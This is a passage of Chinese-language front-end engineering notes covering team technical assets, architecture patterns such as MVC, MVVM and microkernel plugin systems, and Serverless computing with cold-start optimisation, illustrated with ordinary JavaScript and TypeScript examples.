logging\n````\n\n### 4.4. 构建配置模板\n\n```javascript\n// webpack配置模板\nmodule.exports = {\n  // 基础配置\n  base: {\n    // ...\n  },\n  // 开发环境\n  development: {\n    // ...\n  },\n  // 生产环境\n  production: {\n    // ...\n  }\n};\n\n// babel配置模板\nmodule.exports = {\n  presets: [\n    // ...\n  ],\n  plugins: [\n    // ...\n  ]\n};\n```\n\n## 5. 业务资产\n\n### 5.1. 业务组件\n\n- 业务表单\n- 业务列表\n- 业务图表\n- **特定领域组件**\n\t- 工业领域的\n\t\t- 甘哲图\n\t\t- 排产图\n\t\t- BOM 树\n\t\t- 等等\n\n### 5.2. 业务模型\n\n```typescript\n// 用户模型\ninterface User {\n  id: string;\n  name: string;\n  permissions: Permission[];\n  department: Department;\n}\n\n// 订单模型\ninterface Order {\n  orderId: string;\n  customer: Customer;\n  products: Product[];\n  status: OrderStatus;\n  payment: Payment;\n}\n\n// 业务流程模型\ninterface BusinessFlow {\n  steps: FlowStep[];\n  rules: BusinessRule[];\n  validators: FlowValidator[];\n}\n```\n\n## 6. 质量保障资产\n\n### 6.1. 测试资产\n\n>   mock 数据也是一种资产，之前做产品体验平台还是使用过这个 mock 资产\n\n````typescript\n  // 1. 测试用例库\n  @company/test-cases\n  ├── unit/\n  │   ├── components/\n  │   └── utils/\n  ├── integration/\n  │   ├── flows/\n  │   └── pages/\n  └── e2e/\n      ├── scenarios/\n      └── fixtures/\n\n  // 2. Mock数据库\n  @company/mock-data\n  ├── api/\n  ├── user/\n  └── business/\n\n  // 3. 测试工具集\n  @company/test-utils\n  ├── generators/    // 测试数据生成\n  ├── matchers/     // 自定义匹配器\n  └── helpers/      // 辅助函数\n````\n\n### 6.2. 性能监控体系\n\n- 监控系统\n\t- 性能监控\n\t- 错误监控\n\t- 用户行为监控\n\t- 业务监控\n\n```typescript\n// 性能监控配置\nconst performanceMonitor = {\n  metrics: {\n    FCP: true,      // First Contentful Paint\n    LCP: true,      // Largest Contentful Paint\n    FID: true,      // First Input Delay\n    CLS: true       // Cumulative Layout Shift\n  },\n  errorTracking: {\n    // 错误监控配置\n  },\n  resourceTracking: {\n    // 资源监控配置\n  }\n};\n```\n\n### 6.3. 运维工具\n\n```typescript\n// 运维工具示例\nconst devOpsTools = {\n  // 日志分析\n  logAnalyzer: {\n    collect: () => {},\n    analyze: () => {},\n    alert: () => {}\n  },\n  \n  // 性能分析\n  performanceAnalyzer: {\n    metrics: [],\n    analyze: () => {},\n    report: () => {}\n  },\n  \n  // 发布工具\n  deployment: {\n    verify: () => {},\n    deploy: () => {},\n    rollback: () => {}\n  }\n}\n\n```\n\n## 7. 安全资产\n\n### 7.1. 安全配置\n\n- CSP配置\n- 安全头配置\n- 加密算法\n- 安全策略\n\n```javascript\n// 安全配置\nmodule.exports = {\n  // CSP配置\n  contentSecurityPolicy: {\n    directives: {\n      defaultSrc: [\"'self'\"],\n      scriptSrc: [\"'self'\", \"'unsafe-inline'\"],\n      styleSrc: [\"'self'\", \"'unsafe-inline'\"],\n      imgSrc: [\"'self'\", \"data:\", \"https:\"],\n    }\n  },\n  // XSS防护\n  xssProtection: true,\n  // CSRF配置\n  csrfProtection: {\n    enabled: true,\n    cookieName: 'csrf-token'\n  }\n};\n```\n\n### 7.2. 安全工具\n\n- 代码扫描工具\n- ==漏洞扫描工具==\n- 依赖检查工具\n- 代码安全审计工具\n- 安全测试套件\n- 代码扫描工具\n\t- 比如 `sonar` 等\n\n## 8. 设计资产\n\n````markdown\n\n  # 设计系统\n\n  ## 基础\n  - 色彩系统\n  - 字体系统\n  - 间距系统\n  - 动画系统\n\n  ## 组件设计\n  - 组件变量\n  - 主题配置\n  - 样式指南\n\n  ## 设计资源\n  - Sketch 组件库\n  - Figma 组件库\n  - 图标资源\n  - 插画资源\n````\n\n## 9. 数据资产：数据分析体系\n\n```typescript\n// 数据采集配置\nconst analytics = {\n  // 用户行为跟踪\n  behavior: {\n    click: true,\n    scroll: true,\n    duration: true\n  },\n  // 业务数据采集\n  business: {\n    conversion: true,\n    engagement: true\n  },\n  // 性能数据\n  performance: {\n    timing: true,\n    resources: true\n  }\n};\n```\n\n## 10. 流程资产\n\n### 10.1. 开发流程模板\n\n![图片&文件](./files/20241028-5.png)\n````mermaid\n  graph TD\n    A[需求分析] --> B[技术方案]\n    B --> C[开发实现]\n    C --> D[代码审查]\n    D --> E[测试验证]\n    E --> F[部署上线]\n    F --> G[监控运维]\n````\n\n### 10.2. 质量保障流程\n\n- 代码审查流程\n- 测试流程\n- 发布流程\n- ==事故处理流程==\n\n### 10.3. 项目管理==模板==\n\n```markdown\n# 项目模板库\n\n- 项目启动文档模板\n- 技术方案文档模板\n- 评审会议记录模板\n- 上线检查清单\n- 复盘报告模板\n```\n\n## 11. 培训资产：培训体系\n\n```markdown\n# 培训资料库\n\n## 新人培训\n- 开发环境搭建\n- 基础技术栈培训\n- 工程规范培训\n- 工具使用指南\n\n## 进阶培训\n- 性能优化专题\n- 安全开发实践\n- 架构设计思路\n- 源码分析方法\n```\n\n## 12. 资产运营\n\n- 资产管理\n\t- 建立**统一的资产管理平台**\n\t\t- 建立资产目录\n\t\t- 版本管理\n\t\t- 使用统计\n\t\t- 权限控制\n\t- 版本控制和变更追踪\n\t- 定期评估和更新\n\t- 使用频率统计\n\t- 维护成本评估\n\t- 价值评估\n\t- 更新机制\n- **资产运营**\n\t- 完善文档和使用指南\n\t- 建立反馈机制\n\t- 持续优化和迭代\n\t- 资产度量\n\t\t- 使用情况统计\n\t\t- 问题反馈统计\n\t\t- 维护成本统计\n\t- 内部推广\n\t- 使用培训\n\t- 反馈收集\n\t- 持续优化\n- **资产治理**\n\t- 制定资产管理规范\n\t- 建立评审机制\n\t- 定期进行资产清理\n\n## 13. 结果\n\n通过系统化管理这些资产，可以：\n- 提高团队开发效率\n- 保证技术标准统一\n- 降低维护成本\n- 加速新人融入\n- 保证代码质量，提升产品质量\n- 沉淀团队能力\n\n","ydJc5Hnq":"\n# 前端常见的架构思路\n\n`#前端架构` \n\n\n## 目录\n<!-- toc -->\n ## 总结 \n\n- 分层架构\n\t- mvc \n\t- MVVM \n\t- vdom\n\t- 前中后台\n\t- 语言抽象的层次越高\n\t\t- 一般运行效率可能会有所衰减\n\t\t- 看`js/ts/c/汇编/机器码`等等等\n\t- 前端框架的分层\n\t\t-  **表现层**\n\t\t\t- 用户界面\n\t\t\t- 路由管理\n\t\t- **业务层**\n\t\t\t- 业务逻辑\n\t\t\t- 状态管理\n\t\t- **数据层**\n\t\t\t- API 调用\n\t\t\t- 数据持久化\n- 模块化结构 → 将应用分解为独立的功能模块\n\t- esm commonjs\n- 管道和过滤器：数据流处理，每个处理单元==独立且可组合==\n\t- gulp pile\n\t- koa 中间件 \n\t\t- 洋葱模型也有`管道`的影子\n\t- `vue`的`filter` \n\t- Node 中 `流` 的\n- 事件驱动/发布-订阅 → 松耦合\n- fork 风格：复制共享状态或资源来实现并行处理的架构模式\n\t- nodejs\n\t\t- 比如`nodeJS`的 `Cluster 模块` \n\t\t\t- `Cluster`'这个词在计算机科学中通常指的是**一组计算机或服务器**\n\t- web worker\n\t- 多线程等\n- 组件化架构：\n\t- 将UI和功能封装成独立、可重用的组件\n\t\t- 高内聚、低耦合\n- 微前端架构：\n\t- 将前端应用分解为多个独立的微前端应用\n- 单向数据流：Flux/Redux 架构\n- 微内核架构，又称为”插件架构”\n\t- 核心系统\n\t- 插件模块\n\t\t- 比如 `Webpack、Babel、PostCSS`以及`ESLint`\n\t\t- 比如`jQuery`插件：简单说就是`jQuery.prototype.extend`用于扩展插件\n\t- 实现要点：\n\t\t- 微内核\n\t\t\t- ![图片&文件](./files/20250103-2.png)\n\t\t- 插件系统\n\t\t\t- ![图片&文件](./files/20250103-3.png)\n\t\t- 插件间通讯\n\t\t- 事件驱动的插件系统\n\n## 1. 分层架构\n\n核心思想：关注点分离，每层只负责特定功能。\n\n没有什么问题是分层解决不了，如果解决不了, 就再加一层\n- 比如`网络协议`，越来高层面向`人类`，底层面向`机器`\n- 又比如现在所谓的 `后台、中台、前台`\n- 又比如，语言抽象的层次越高，一般运行效率可能会有所衰减，看`js/ts/c/汇编/机器码`等等等\n- 又比如，mvc 、MVVM 等等\n\n回到，前端：\n- `V-dom`，就是之前DOM上的一个分层 \n\t- 开发方式由之前`jQuery方式` 变成了`view=f(state)` 方式\n\n### 1.1. 示例：MVC 架构\n\n- **Model (模型)**: 数据和业务逻辑\n- **View (视图)**: 用户界面\n- **Controller (控制器)**: 处理用户输入，协调 Model 和 View\n\n```javascript\n// Model\nclass UserModel {\n    constructor(name, age) {\n        this.name = name;\n        this.age = age;\n    }\n    \n    updateName(name) {\n        this.name = name;\n    }\n}\n\n// View\nclass UserView {\n    render(user) {\n        return `<div>\n            <h1>${user.name}</h1>\n            <p>Age: ${user.age}</p>\n        </div>`;\n    }\n}\n\n// Controller\nclass UserController {\n    constructor(model, view) {\n        this.model = model;\n        this.view = view;\n    }\n    \n    updateUserName(name) {\n        this.model.updateName(name);\n        this.refreshView();\n    }\n    \n    refreshView() {\n        const html = this.view.render(this.model);\n        document.body.innerHTML = html;\n    }\n}\n```\n\n### 1.2. 示例 2：MVVM\n\n- **Model**: 数据模型\n- **View**: 视图层\n- **ViewModel**: 视图模型，处理视图逻辑\n\nVue.js 示例\n\n```javascript\n// MVVM 实现示例 (Vue)\nconst app = new Vue({\n    // View Model\n    data: {\n        message: 'Hello MVVM'\n    },\n    methods: {\n        updateMessage(newValue) {\n            this.message = newValue;\n        }\n    },\n    // View\n    template: `\n        <div>\n            <h1>{{message}}</h1>\n            <input v-model=\"message\">\n        </div>\n    `\n});\n```\n\n### 1.3. 示例 3：前端框架的分层\n\n- **表现层**\n\t- 用户界面\n\t- 路由管理\n- **业务层**\n\t- 业务逻辑\n\t- 状态管理\n- **数据层**\n\t- API 调用\n\t- 数据持久化\n\n```javascript\n// 分层架构示例\n// API 层\nclass UserAPI {\n    static async getUser(id) {\n        return await fetch(`/api/users/${id}`);\n    }\n}\n\n// 服务层\nclass UserService {\n    static async getUserInfo(id) {\n        const user = await UserAPI.getUser(id);\n        return this.formatUserData(user);\n    }\n    \n    static formatUserData(user) {\n        // 数据处理逻辑\n        return {\n            ...user,\n            fullName: `${user.firstName} ${user.lastName}`\n        };\n    }\n}\n\n// 视图层\nclass UserComponent extends React.Component {\n    async componentDidMount() {\n        const user = await UserService.getUserInfo(this.props.id);\n        this.setState({ user });\n    }\n    \n    render() {\n        // 渲染逻辑\n    }\n}\n```\n\n## 2. 模块化结构\n\n- ES Modules\n- CommonJS\n- AMD/RequireJS\n\n## 3. 管道和过滤器\n\n核心思想：数据流处理，每个处理单元独立且可组合。\n- 比如在`Angular`里就有`管道`概念\n- gulp的 `pipe`\n- 甚至`koa`里的洋葱模型也有`管道`的影子（中间件）\n- `vue`的`filter` 如 `{{ message | capitalize }}`\n- Node 中 `流` 的概念\n\n## 4. 事件驱动/发布-订阅\n\n核心思想：\n- 通过事件的发布和订阅实现**松耦合**。\n\n## 5. 复制：fork 风格\n\nFork 风格是一种通过复制共享状态或资源来实现并行处理的架构模式。在前端中，主要用于：\n\n- 状态管理\n- 并行计算\n- 数据隔离\n- 多线程处理\n\n### 5.1. Web Worker 中的 Fork\n\n### 5.2. 比如`nodeJS`的 `Cluster 模块` \n\n- Node.js 中的**集群模块**，允许创建`多个工作进程`来处理并发请求\n- '`Cluster`' 这个词在计算机科学中通常指的是一组计算机或服务器，它们一起工作以提供更高的性能和可用性\n\n```javascript hl:5,16\nconst cluster = require('cluster');\nconst http = require('http');\nconst numCPUs = require('os').cpus().length;\n\nif (cluster.isMaster) {\n  console.log(`Master ${process.pid} is running`);\n\n  // Fork workers.\n  for (let i = 0; i < numCPUs; i++) {\n    cluster.fork();\n  }\n\n  cluster.on('exit', (worker, code, signal) => {\n    console.log(`worker ${worker.process.pid} died`);\n  });\n} else {\n  // Workers 可以共享任意的TCP连接 \n  // 比如 共享HTTP服务器 \n  http.createServer((req, res) => {\n    res.writeHead(200);\n    res.end('hello world\\n');\n  }).listen(8000);\n\n  console.log(`Worker ${process.pid} started`);\n}\n```\n\n## 6. 组件化架构（Component-Based Architecture）\n\n核心思想：==将UI和功能封装成独立、可重用的组件==。\n\n- 设计原则\n\t- 单一职责\n\t- 高内聚、低耦合\n\t- 可复用性\n\n## 7. 模块化架构（Modular Architecture）\n\n核心思想：将应用分解为独立的功能模块\n\n## 8. 微服务前端架构（Micro-Frontend Architecture）\n\n核心思想：将前端应用分解为多个独立的微前端应用。\n\n- 应用独立开发、部署\n- 技术栈无关\n- 独立运行时\n\n## 9. 单向数据流：Flux/Redux 架构\n\n- **Store**: 状态容器\n- **Action**: 动作描述\n- **Reducer**: 状态计算\n- **Dispatcher**: 分发器\n\n## 10. 微内核架构，又称为”插件架构”\n\n### 10.1. 基本概念\n\n微内核架构主要包含两部分：\n1. 核心系统（Microkernel）：提供最基本的功能\n2. 插件模块（Plugins）：提供扩展功能\n\n- 微内核结构的难点在于建立一套粒度合适的**插件协议**、以及对插件之间进行适当的`隔离和解耦`。\n\t- 从而才能保证良好的扩展性、灵活性和可迁移性。\n- 前端领域比较典型的例子是`Webpack、Babel、PostCSS`以及`ESLint`,\n\t- 这些应用需要应对复杂的定制需求，而且这些需求时刻在变，只有微内核架构才能保证灵活和可扩展性。\n- 比如`jQuery`插件：简单说就是`jQuery.prototype.extend`用于扩展插件\n\n```javascript\n// jQuery 入口函数\nvar jQuery = function (selector, context) {\n    return new jQuery.init(selector, context);\n};\n\n// jQuery 核心原型定义，也是 jQuery plugin 的扩展接口\njQuery.fn = jQuery.prototype = {\n    hello: function hello() {\n        console.log(\"hello world\");\n    },\n    //... 其他定义\n};\n\n// 另一种扩展 plugin 的便捷方法，接收一个对象\njQuery.extend = jQuery.fn.extend = function(targetObj) {\n    // 克隆 targetObj\n}\n\n// jQuery 真正的实例化构造函数\nvar init = function (selector, context) {\n    // init dom elements\n}\ninit.prototype = jQuery.fn;\njQuery.init = init;\n$ = jQuery;\n```\n\n下面介绍前端微内核架构（Plugin Architecture）的设计思路和实现方式：\n\n### 10.2. 基础微内核系统实现\n\n```javascript\n// 基础微内核系统实现\nclass Microkernel {\n    constructor() {\n        this.plugins = new Map();\n        this.hooks = new Map();\n    }\n\n    // 注册插件\n    registerPlugin(name, plugin) {\n        this.plugins.set(name, plugin);\n        // 初始化插件\n        plugin.apply(this);\n    }\n\n    // 注册钩子\n    addHook(name, callback) {\n        if (!this.hooks.has(name)) {\n            this.hooks.set(name, []);\n        }\n        this.hooks.get(name).push(callback);\n    }\n\n    // 触发钩子\n    async applyHooks(name, ...args) {\n        const hooks = this.hooks.get(name) || [];\n        for (const hook of hooks) {\n            await hook(...args);\n        }\n    }\n}\n```\n\n### 10.3. 插件系统实现\n\n```javascript\n// 插件基类\nclass Plugin {\n    constructor(options = {}) {\n        this.options = options;\n    }\n\n    apply(kernel) {\n        // 由具体插件实现\n    }\n}\n\n// 生命周期管理\nclass LifecyclePlugin extends Plugin {\n    apply(kernel) {\n        kernel.addHook('beforeInit', () => {\n            console.log('Before initialization');\n        });\n\n        kernel.addHook('afterInit', () => {\n            console.log('After initialization');\n        });\n    }\n}\n\n// 路由插件示例\nclass RouterPlugin extends Plugin {\n    apply(kernel) {\n        kernel.addHook('route', (path) => {\n            // 路由处理逻辑\n            console.log(`Routing to ${path}`);\n        });\n    }\n}\n```\n\n### 10.4. Webpack 风格的插件系统\n\n```javascript\n// Webpack风格的编译器实现\nclass Compiler {\n    constructor() {\n        this.hooks = {\n            start: new SyncHook(),\n            compile: new AsyncSeriesHook(['compilation']),\n            done: new SyncHook(['stats'])\n        };\n        this.plugins = [];\n    }\n\n    // 应用插件\n    use(plugin) {\n        this.plugins.push(plugin);\n        plugin.apply(this);\n    }\n\n    // 运行编译\n    async run() {\n        this.hooks.start.call();\n        \n        const compilation = {};\n        await this.hooks.compile.promise(compilation);\n        \n        this.hooks.done.call({ success: true });\n    }\n}\n\n// Webpack风格的插件示例\nclass MyPlugin {\n    apply(compiler) {\n        compiler.hooks.start.tap('MyPlugin', () => {\n            console.log('开始编译');\n        });\n\n        compiler.hooks.compile.tapAsync('MyPlugin', async (compilation, callback) => {\n            console.log('编译中...');\n            await someAsyncTask();\n            callback();\n        });\n\n        compiler.hooks.done.tap('MyPlugin', (stats) => {\n            console.log('编译完成');\n        });\n    }\n}\n```\n\n### 10.5. UmiJS 风格的插件系统\n\n```javascript\n// UmiJS风格的服务实现\nclass UmiService {\n    constructor() {\n        this.plugins = [];\n        this.hooks = {};\n    }\n\n    // 注册插件\n    registerPlugin(plugin) {\n        this.plugins.push(plugin);\n    }\n\n    // 应用插件\n    applyPlugins() {\n        this.plugins.forEach(plugin => {\n            plugin.apply({\n                api: this.getAPI(),\n                service: this\n            });\n        });\n    }\n\n    // 获取API接口\n    getAPI() {\n        return {\n            // 修改配置\n            modifyConfig: (fn) => {\n                this.hooks.modifyConfig = fn;\n            },\n            // 添加路由\n            addRoutes: (routes) => {\n                this.hooks.addRoutes = routes;\n            }\n        };\n    }\n}\n\n// UmiJS插件示例\nclass UmiPlugin {\n    apply({ api }) {\n        // 修改配置\n        api.modifyConfig((config) => {\n            return {\n                ...config,\n                // 添加配置\n            };\n        });\n\n        // 添加路由\n        api.addRoutes([\n            {\n                path: '/custom',\n                component: './CustomPage'\n            }\n        ]);\n    }\n}\n```\n\n### 10.6. 事件驱动的插件系统\n\n```javascript\n// 事件驱动的插件系统\nclass EventDrivenCore {\n    constructor() {\n        this.events = new Map();\n        this.plugins = new Set();\n    }\n\n    // 注册插件\n    use(plugin) {\n        this.plugins.add(plugin);\n        plugin.setup(this);\n    }\n\n    // 注册事件监听\n    on(event, handler) {\n        if (!this.events.has(event)) {\n            this.events.set(event, new Set());\n        }\n        this.events.get(event).add(handler);\n    }\n\n    // 触发事件\n    emit(event, ...args) {\n        const handlers = this.events.get(event);\n        if (handlers) {\n            handlers.forEach(handler => handler(...args));\n        }\n    }\n}\n\n// 事件驱动插件示例\nclass LoggerPlugin {\n    setup(core) {\n        core.on('request', (req) => {\n            console.log(`${new Date()}: ${req.url}`);\n        });\n    }\n}\n```\n\n### 10.7. 可配置的插件系统\n\n```javascript\n// 配置系统\nclass Config {\n    constructor(initialConfig = {}) {\n        this.config = initialConfig;\n    }\n\n    get(key) {\n        return this.config[key];\n    }\n\n    set(key, value) {\n        this.config[key] = value;\n    }\n\n    merge(newConfig) {\n        this.config = {\n            ...this.config,\n            ...newConfig\n        };\n    }\n}\n\n// 可配置的插件核心\nclass ConfigurableCore {\n    constructor() {\n        this.config = new Config();\n        this.plugins = new Map();\n    }\n\n    // 使用插件\n    use(plugin, options = {}) {\n        const instance = new plugin(options);\n        this.plugins.set(plugin.name, instance);\n        instance.apply(this);\n    }\n\n    // 获取配置\n    getConfig() {\n        return this.config;\n    }\n}\n\n// 可配置插件示例\nclass ThemePlugin {\n    constructor(options) {\n        this.options = options;\n    }\n\n    apply(core) {\n        core.getConfig().merge({\n            theme: this.options.theme || 'light'\n        });\n    }\n}\n```\n\n### 10.8. 插件通信机制\n\n```javascript\n// 插件间通信系统\nclass PluginMessenger {\n    constructor() {\n        this.channels = new Map();\n    }\n\n    // 创建通信通道\n    createChannel(name) {\n        if (!this.channels.has(name)) {\n            this.channels.set(name, new Set());\n        }\n        return {\n            send: (message) => this.broadcast(name, message),\n            subscribe: (handler) => this.subscribe(name, handler)\n        };\n    }\n\n    // 广播消息\n    broadcast(channel, message) {\n        const subscribers = this.channels.get(channel);\n        if (subscribers) {\n            subscribers.forEach(handler => handler(message));\n        }\n    }\n\n    // 订阅消息\n    subscribe(channel, handler) {\n        if (!this.channels.has(channel)) {\n            this.channels.set(channel, new Set());\n        }\n        this.channels.get(channel).add(handler);\n    }\n}\n\n// 使用通信的插件示例\nclass DataPlugin {\n    apply(core) {\n        const channel = core.messenger.createChannel('data');\n        \n        // 发送数据\n        channel.send({ type: 'update', data: {} });\n    }\n}\n\nclass UIPlugin {\n    apply(core) {\n        const channel = core.messenger.createChannel('data');\n        \n        // 接收数据\n        channel.subscribe((message) => {\n            if (message.type === 'update') {\n                this.updateUI(message.data);\n            }\n        });\n    }\n}\n```\n\n微内核架构的优点：\n1. 高度可扩展\n2. 模块化程度高\n3. 核心功能精简\n4. 插件按需加载\n5. 维护成本低\n使用场景：\n1. 构建工具（Webpack、Rollup）\n2. 框架（UmiJS、VuePress）\n3. 编辑器插件系统\n4. 应用扩展系统\n需要注意的问题：\n1. 插件依赖管理\n2. 插件加载顺序\n3. 插件冲突处理\n4. 性能开销控制\n5. 版本兼容性\n\n## 11. 实践建议\n\n1. 不要过度设计\n2. 保持架构的灵活性\n3. 考虑未来的扩展性\n4. 关注代码的可测试性\n5. 注重开发效率和维护成本\n\n## 12. 好的架构应该是\n\n- 清晰易懂\n- 易于维护\n- 便于扩展\n- 性能优良\n- 适合团队\n","fttg2rzL":"\n# Serverless（无服务器计算）\n\n`#前端架构` \n\n\n## 目录\n<!-- toc -->\n ## 总结 \n\n- 无需关心服务器基础设施，由云服务商维护\n- 实际使用量计费\n- 主要优势\n\t- 降低运维成本\n\t\t- 无需管理服务器\n\t\t- 自动扩缩容\n\t\t- 降低人力成本\n\t- 成本优化\n\t\t- 按使用量付费\n\t\t- 无需为`闲置资源`付费\n\t\t- 更精确的资源利用\n\t- 开发效率\n\t\t- 专注`业务逻辑`\n\t\t- 快速部署\n\t\t- 天然的`微服务架构`\n- 注意点\n\t- ==①== 冷启动问题\n\t\t- 环境准备：分配计算资源、启动容器&运行时&加载运行环境等\n\t\t- 代码准备\n\t\t\t- 下载代码 → 解压代码 → 安装依赖\n\t\t- 运行时：\n\t\t\t- 代码执行，数据库链接等等\n\t- ==②== 供应商锁定\n\t\t- 解决方案：抽象层\n\n## 1. Serverless 介绍\n\n### 1.1. **Serverless 的本质**\n\n- 无需关心服务器基础设施，由云服务商维护\n- 按实际使用计费（Pay as you go）：\n\t- 只在需要时运行，按实际使用量计费\n- 自动弹性伸缩：\n\t- 根据负载自动扩展或收缩资源\n- **事件驱动架构**，通常基于事件触发执行\n- **FaaS（Function as a Service）+ BaaS（Backend as a Service）的结合**\n\t- **FaaS (Function as a Service)**\n\t\t- AWS Lambda\n\t\t- Azure Functions\n\t\t- Google Cloud Functions\n\t\t- 阿里云函数计算\n\t- **BaaS（Backend as a Service）**\n\t\t- 数据库服务（如 DynamoDB）\n\t\t- 身份认证服务\n\t\t- 消息队列服务\n\t\t- 对象存储服务\n\n### 1.2. 2024年 Serverless 发展趋势\n\n1. **AI 集成增强**\n    - Serverless 平台正在深度集成 AI 能力\n    - 支持 AI 模型的部署和推理\n    - 提供 AI 相关的预构建函数 \n2. **流处理和实时数据**\n    - Serverless 流处理架构日益普及\n    - 支持实时数据分析和处理\n    - 事件驱动架构的深度整合\n3. **混合云部署**\n    - 支持跨云平台部署\n    - 统一的管理和监控能力\n    - 更灵活的资源调度\n\n### 1.3. **主要优势**\n\n- 降低运维成本\n\t- 无需管理服务器\n\t- 自动扩缩容\n\t- 降低人力成本\n- 成本优化\n\t- 按使用量付费\n\t- 无需为`闲置资源`付费\n\t- 更精确的资源利用\n- 开发效率\n\t- 专注`业务逻辑`\n\t- 快速部署\n\t- 天然的`微服务架构`\n\n### 1.4. **常见应用场景**\n\n   - 事件触发处理\n     - 文件上传处理\n     - 消息队列处理\n     - WebHook 处理\n   - Web 应用\n     - API 接口服务\n     - SSR（服务端渲染）\n     - 静态网站托管\n     - 用户认证授权\n   - 定时任务\n     - 数据同步\n     - 定时备份\n     - 报表生成\n   - 实时数据处理\n     - 日志处理\n     - IoT 数据处理\n\t     - 设备控制命令下发\n     - 流数据分析\n\n### 1.5. **技术架构**\n\n![图片&文件](./files/20241028-1.png)\n\n1. 功能解耦，保持函数单一职责\n    - 合理设计触发器\n    - 注意冷启动优化\n    - 使用合适的状态管理策略\n2. **开发流程**\n    - 采用基础设施即代码（IaC）\n    - 完善的测试策略\n    - 本地开发环境模拟\n    - 监控和日志体系建设\n3. **性能优化**\n    - 合理设置内存和超时时间\n    - 利用缓存减少冷启动\n    - 代码包大小优化\n    - 并发控制\n\n### 1.6. **主流服务商对比**\n\n   \n| 服务商 | 产品名称 | 特点 |\n|-------|---------|------|\n| AWS | Lambda | 最成熟、生态最完善 |\n| 阿里云 | 函数计算 | 国内完善、集成度高 |\n| 腾讯云 | 云函数 | 性价比高、本土化服务 |\n| Google | Cloud Functions | 全球化、AI集成好 |\n| Azure | Functions | 企业级服务完善 |\n\n### 1.7. **开发最佳实践**\n\n   - 函数设计\n     - 单一职责原则\n     - 控制执行时间\n     - 合理设计触发器\n     - 合理使用内存\n     - 注意`冷启动`优化\n   - 状态管理\n     - 使用**外部存储**保存状态\n     - 缓存合理利用\n     - 注意数据一致性\n   - 监控告警\n     - 完善的日志记录\n     - 性能监控\n     - 错误追踪\n     - 成本监控\n\n### 1.8. **常见挑战和解决方案**\n\n   - 开发体验问题：\n\t   - 本地开发和调试困难\n   - **冷启动**问题\n     - 预热机制\n     - 代码优化\n     - 合理设置内存\n     - **后面会详细介绍**\n   - 本地开发调试\n     - 使用模拟器\n     - 本地测试框架\n     - 完善的开发工具\n   - **供应商锁定风险**：vendor lock-in \n     - 抽象化设计\n     - 标准化接口\n     - 多云架构设计\n - **安全性**\n    - 权限最小化原则\n    - 安全策略配置\n    - 数据加密传输\n    - 审计日志完善\n\n### 1.9. 前端开发者的 Serverless 实践\n\n1. **前端集成**\n    - API 网关集成\n    - 静态资源部署\n    - 身份认证\n    - 前端`构建流程`\n2. **开发工具**\n    - Serverless Framework\n    - AWS SAM\n    - Vercel\n    - Netlify\n3. **最佳实践**\n    - 合理的 API 设计\n    - 错误处理机制\n    - 性能监控\n    - 安全防护\n\n### 1.10. **前端视角的 Serverless**\n\n   - SSR 应用\n     ```typescript\n     // Next.js Serverless 函数示例\n     export async function getServerSideProps(context) {\n       const data = await fetchData();\n       return {\n         props: { data }\n       };\n     }\n     ```\n   - API 路由\n     ```typescript\n     // Vercel Serverless 函数示例\n     export default async function handler(req, res) {\n       if (req.method === 'POST') {\n         const data = await processData(req.body);\n         res.status(200).json(data);\n       }\n     }\n     ```\n\n### 1.11. **未来趋势**\n\n   - Edge Computing 集成\n   - `WebAssembly` 支持\n   - 更好的开发体验\n   - 混合云架构\n   - 更低的延迟\n   - 更强的计算能力\n\n### 1.12. **成本优化建议**\n\n- 合理设置超时时间\n- 优化函数执行效率\n- 使用缓存减少调用\n- 选择合适的内存配置\n- 监控成本支出\n\n### 1.13. **工具生态**\n\n![图片&文件](./files/20241028-2.png)\n\n- Serverless 是云计算发展的重要方向，它能够帮助团队更专注于业务开发，提高开发效率，优化资源使用。\n- 但在采用 Serverless 架构时，需要充分考虑其特点和限制，选择合适的场景，做好相应的优化和规划。\n- 随着技术的发展和生态的完善，Serverless 的应用场景会越来越广泛，值得团队持续关注和实践。\n\n## 2. `冷启动`\n\n让我详细解释一下冷启动（Cold Start）的概念：\n\n> 即`首次启动` \n\n### 2.1. 什么是冷启动？\n\n冷启动是指 Serverless 函数在完全\"冷\"的状态下（即`首次运行或长时间未运行`）被调用时，需要经历的初始化过程。这个过程包括：\n\n- **环境准备**\n\t- 分配计算资源\n\t- 启动容器/运行时\n\t- 加载运行环境（如 Node.js、Python 等）\n- **代码加载**\n\t- 下载函数代码\n\t- 解压代码包\n\t- 加载依赖项\n- **运行时初始化**\n\t- 执行全局代码\n\t- 建立数据库连接\n\t- 初始化外部服务客户端\n\n### 2.2. 冷启动 vs 热启动\n\n- **冷启动（Cold Start）**\n\t- 函数完全从零开始初始化\n\t- 耗时较长（可能几百毫秒到几秒）\n\t- 发生在首次调用或长时间未使用时\n- **热启动（Warm Start）**\n\t- 复用已有的运行环境\n\t- 响应速度快（通常在毫秒级）\n\t- 发生在短时间内的重复调用\n\n例如：\n![图片&文件](./files/20241028-3.png)\n\n### 2.3. 冷启动的影响因素\n\n- **运行时环境**\n\t- Node.js 通常启动较快\n\t- Java、.NET 等启动较慢\n\t- Python、Go 介于中间\n- **代码包大小**\n\t- 代码包越大，加载时间越长\n\t- 依赖项数量影响初始化时间\n- **初始化逻辑**\n\t- 数据库连接建立\n\t- 外部服务客户端初始化\n\t- 配置加载\n\n### 2.4. 优化冷启动的策略\n\n#### 2.4.1. **代码层面优化**\n\n   ```javascript hl:10\n   // 不推荐\n   function handler(event) {\n     // 每次调用都初始化\n     const db = new Database();\n     const client = new APIClient();\n     // ...\n   }\n\n   // 推荐\n   // 全局初始化，可以在热启动时复用\n   const db = new Database();\n   const client = new APIClient();\n   \n   function handler(event) {\n     // 直接使用已初始化的连接\n     // ...\n   }\n   ```\n\n#### 2.4.2. **保持函数活跃**\n\n- 使用`定时器定期调用函数`\n- `预热关键路径`的函数\n- 使用`预留并`发（如 AWS Lambda 提供的功能）\n\n#### 2.4.3. **优化依赖**\n\n- 精简依赖包\n- 使用轻量级库\n- 按需加载模块\n\n#### 2.4.4. **架构优化**\n\n- 使用`连接池`\n- `缓存`频繁访问的数据\n- 合理设置`超时时间`\n\n### 2.5. 实际影响\n\n假设一个典型的 Web API 场景：\n\n- **正常情况（热启动）**\n\t- API 响应时间：~100ms\n\t- 用户体验良好\n- **冷启动情况**\n\t- Node.js：额外 300-500ms\n\t- Python：额外 500-800ms\n\t- Java：额外 1-3秒\n\t- 用户可能感知到明显延迟\n\n### 2.6. 监控和分析\n\n- **关键指标**\n\t- 初始化时间\n\t- 执行时间\n\t- 冷启动频率\n- **监控工具**\n\t- 云平台自带的监控\n\t- 自定义日志分析\n\t- APM 工具\n\n### 2.7. 使用建议\n\n- **评估业务需求**\n\t- 